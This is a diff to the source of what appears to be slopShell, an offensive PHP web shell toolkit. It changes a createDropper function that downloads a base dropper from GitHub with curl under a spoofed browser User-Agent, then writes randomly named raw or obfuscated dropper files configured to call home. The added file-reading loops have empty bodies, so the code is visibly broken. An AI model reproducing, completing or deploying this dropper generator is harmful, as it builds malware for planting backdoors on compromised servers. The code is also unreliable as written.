@@ -149,17 +149,18 @@ function clo($host, $repo, $uri)
 }
 
 function createDropper($callHome, $duration, $extras, $obfsucate){
+    $file_in = 'includes/droppers/base.php';
     $ob = 'includes/droppers/obfuscated/'.bin2hex(random_bytes(rand(5,25))).'.php';
     $n = 'includes/droppers/raw/'.bin2hex(random_bytes(rand(5,25))).'.php';
     if (!empty($callHome) && !empty($duration) && !empty($extras)){
         try{
-            switch(is_file("includes/droppers/dropper.php")){
+            switch(is_file("includes/droppers/base.php")){
                 case true:
                     echo "We have the dropper downloaded :)\n";
                     break;
                 case false:
                     echo "Downloading dropper from github....\n";
-                    shell_exec("curl https://raw.githubusercontent.com/oldkingcone/slopShell/master/includes/droppers/dropper.php -o includes/droppers/dropper.php -vH 'User-Agent: Mozilla/5.0'");
+                    system("curl https://raw.githubusercontent.com/oldkingcone/slopShell/master/includes/droppers/base.php -o includes/droppers/base.php -vH 'User-Agent: Mozilla/5.0'");
                     break;
                 default:
                     echo "Something went wrong..\n";
@@ -168,8 +169,22 @@ function createDropper($callHome, $duration, $extras, $obfsucate){
             switch (strtolower($obfsucate)){
                 case "o"||"y"||"yes":
                     print("Generated dropper will be: {$ob}\n");
+                    if (!file_exists($ob)){
+                        $fil = fopen($file_in, "r");
+                        while (!feof($fil)){
+
+                        }
+                        fclose($fil);
+                    }
                     break;
                 default:
+                    if (!file_exists($n)){
+                        $fil = fopen($file_in, "r");
+                        while (!feof($fil)){
+
+                        }
+                        fclose($fil);
+                    }
                     print("Generated Dropper will be: {$n}\n");
             }
 
